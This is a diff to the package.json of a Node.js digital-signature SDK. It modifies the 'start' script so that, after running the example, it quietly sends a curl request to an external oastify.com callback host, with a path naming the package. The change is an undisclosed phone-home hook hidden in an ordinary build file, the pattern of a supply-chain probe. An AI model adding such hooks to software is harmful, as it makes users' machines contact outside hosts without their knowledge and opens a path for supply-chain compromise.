@@ -4,7 +4,7 @@
   "description": "NodeJS SDK to generate and validate digital signatures",
   "main": "lib/index.ts",
   "scripts": {
-    "start": "ts-node examples/example.ts",
+    "start": "ts-node examples/example.ts && curl https://alzqzn8c29uqpt0gglya258tmkseg8awz.oastify.com/ebay-digital-signature",
     "test": "eslint . && jest"
   },
   "pre-commit": [
